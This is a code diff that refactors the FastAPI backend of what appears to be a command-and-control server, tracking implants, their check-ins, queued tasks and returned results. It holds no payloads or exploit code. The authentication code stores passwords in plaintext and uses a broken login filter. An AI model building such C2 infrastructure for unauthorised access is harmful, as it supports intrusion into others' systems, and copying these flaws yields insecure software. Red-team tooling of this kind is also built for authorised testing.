@@ -4,39 +4,40 @@ import binascii
 
 from jose import JWTError, jwt
 from datetime import datetime, timedelta, timezone
-
+from typing import List
 
 from fastapi import FastAPI, HTTPException, status
-from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
+from fastapi.security import OAuth2PasswordRequestForm
 from fastapi import Depends, FastAPI, HTTPException, status, Security
 from fastapi.responses import RedirectResponse
 
+from sqlalchemy.orm import relationship
 
-from pydantic import BaseModel
-from typing import List, Optional
+# local imports
+from server_helper.auth_helper import Token, oauth2_scheme
+from server_helper.auth_helper import SECRET_KEY, ALGORITHM, ACCESS_TOKEN_EXPIRE_MINUTES
 
-from sqlalchemy import create_engine, Column, Integer, String, Text, Boolean, DateTime, ForeignKey
-from sqlalchemy.ext.declarative import declarative_base
-from sqlalchemy.orm import sessionmaker, relationship, Session
+from server_helper.user_helper import Users, UserCreate, UserRead, UserDelete
+from server_helper.db import Base, SessionLocal
+
+from server_helper.db import get_db
+
+from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead, ImplantDelete
+from server_helper.tasking_helper import Tasking, TaskingCreate, TaskingRead, TaskingDelete
+
+from server_helper.results_helper import Results, ResultsCreate, ResultsRead, ResultsDelete
+
 
 app = FastAPI()
 
-DATABASE_URL = "sqlite:///./database.db"
-
-SECRET_KEY = "supersecretkey123"
-ALGORITHM = "HS256"
-ACCESS_TOKEN_EXPIRE_MINUTES = 30
-
-# For OAuth2 Bearer token
-oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")
-
-engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
-SessionLocal = sessionmaker(bind=engine, autoflush=False, autocommit=False)
-Base = declarative_base()
-
-class Token(BaseModel):
-    access_token: str
-    token_type: str
+# for client only to be able to access protected endpoints, authentication via OAuth2
+@app.post("/token/", response_model=Token)
+def login(db: SessionLocal = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()): # type: ignore
+    user_exists = db.query(Users).filter(Users.username == form_data.username and Users.password == form_data.password).first()
+    if not user_exists:
+        raise HTTPException(status_code=401, detail="Invalid username or password")
+    access_token = create_access_token(data={"sub": form_data.username})
+    return {"access_token": access_token, "token_type": "bearer"}
 
 
 def create_access_token(data: dict, expires_delta: timedelta | None = None):
@@ -62,147 +63,6 @@ def verify_token(token: str, Depends=(oauth2_scheme)):
     except JWTError:
         raise credentials_exception
 
-
-class Implant(Base):
-    __tablename__ = "implants"
-    id =            Column(Integer, primary_key=True, index=True)
-    session =       Column(String, unique=True, nullable=False)
-    first_checkin = Column(String)
-    last_checkin =  Column(String)
-    alive =         Column(Boolean)
-    callback_freq = Column(Integer)
-    jitter =        Column(Integer)
-    username =      Column(Text)
-    hostname =      Column(Text)
-
-
-class ImplantCreate(BaseModel):
-    session:        Optional[str] = None
-    first_checkin:  Optional[str] = None
-    last_checkin:   Optional[str] = None
-    alive:          Optional[bool] = False
-    callback_freq:  Optional[int] = 0
-    jitter:         Optional[int] = 0
-    username:       Optional[str] = None
-    hostname:       Optional[str] = None
-
-class ImplantRead(ImplantCreate):
-    id: int
-
-    class Config:
-        form_attributes = True
-
-class ImplantDelete(BaseModel):
-    session: str
-
-class Tasking(Base):
-    __tablename__ = "tasking"
-    id = Column(Integer, primary_key=True, index=True)
-    session = Column(String, ForeignKey('implants.session', ondelete="CASCADE"), nullable=False)
-    date = Column(String)
-    task = Column(String)
-    args = Column(String)
-    complete = Column(String, default="False")
-    implant = relationship("Implant", backref="taskings")
-
-class TaskingCreate(BaseModel):
-    session: Optional[str] = None
-    date: Optional[str] = None
-    task: Optional[str] = None
-    args: Optional[str] = None
-    complete: Optional[str] = "False"
-
-class TaskingRead(TaskingCreate):
-    id: int
-
-    class Config:
-        form_attributes = True
-
-class TaskingDelete(BaseModel):
-    id: int
-    session: str
-
-class Results(Base):
-    __tablename__ = "results"
-    id = Column(Integer, primary_key=True, index=True)
-    tasking_id = Column(Integer, ForeignKey('tasking.id', ondelete="CASCADE"), nullable=False)
-    session = Column(String, ForeignKey('implants.session', ondelete="CASCADE"), nullable=False)
-    date = Column(String)
-    task = Column(String)
-    args = Column(String)
-    results = Column(String)
-    implant = relationship("Implant", backref="results")
-
-class ResultsCreate(BaseModel):
-    tasking_id: int
-    session: Optional[str] = None  #implant handles
-    date: Optional[str] = None     #server handles
-    task: Optional[str] = None     #implant handles
-    args: Optional[str] = None     #implant handles
-    results: Optional[str] = None  #implant handles
-
-# only client ensure auth 
-class ResultsRead(ResultsCreate):
-    id: int
-
-    class Config:
-        form_attributes = True 
-
-# only client ensure auth
-class ResultsDelete(BaseModel):
-    id: int
-    session: str
-
-'''
-CREATE TABLE users (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    username TEXT UNIQUE NOT NULL,
-    password TEXT NOT NULL,
-    created_at TEXT NOT NULL
-)
-'''
-class Users(Base):
-    __tablename__ = "users"
-    id = Column(Integer, primary_key=True, index=True)
-    username = Column(String, unique=True, nullable=False)
-    password = Column(String, nullable=False)
-    created_at = Column(String, default=datetime.now(timezone.utc).isoformat())
-
-class UserCreate(BaseModel):
-    username: str
-    password: str
-    created_at: str = datetime.now(timezone.utc).isoformat()
-
-class UserRead(UserCreate):
-    id: int
-
-    class Config:
-        form_attributes = True
-
-class UserDelete(BaseModel):
-    id: int
-
-
-Base.metadata.create_all(bind=engine)
-
-def get_db():
-    db = SessionLocal()
-    try:
-        yield db
-    finally:
-        db.close()
-
-from fastapi import Depends
-
-
-# for client only to be able to access protected endpoints, authentication via OAuth2
-@app.post("/token/", response_model=Token)
-def login(db: SessionLocal = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()): # type: ignore
-    user_exists = db.query(Users).filter(Users.username == form_data.username and Users.password == form_data.password).first()
-    if not user_exists:
-        raise HTTPException(status_code=401, detail="Invalid username or password")
-    access_token = create_access_token(data={"sub": form_data.username})
-    return {"access_token": access_token, "token_type": "bearer"}
 
 # PROTECTED endpoint to view all information about all users
 @app.get("/users", response_model=List[UserRead])
@@ -243,6 +103,8 @@ def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = S
     db.delete(db_user)
     db.commit()
     return UserDelete(id=user_id)
+
+
 
 # recieve tasking output from agent based on session id, marks task complete = True
 @app.post("/results/{session}", response_model=ResultsCreate)
@@ -360,9 +222,6 @@ def delete_implant(session: str, db: SessionLocal = Depends(get_db), token: str 
     db.delete(db_implant)
     db.commit()
     return ImplantDelete(session=session)
-
-
-
 
 
 # implant checkin endpoint
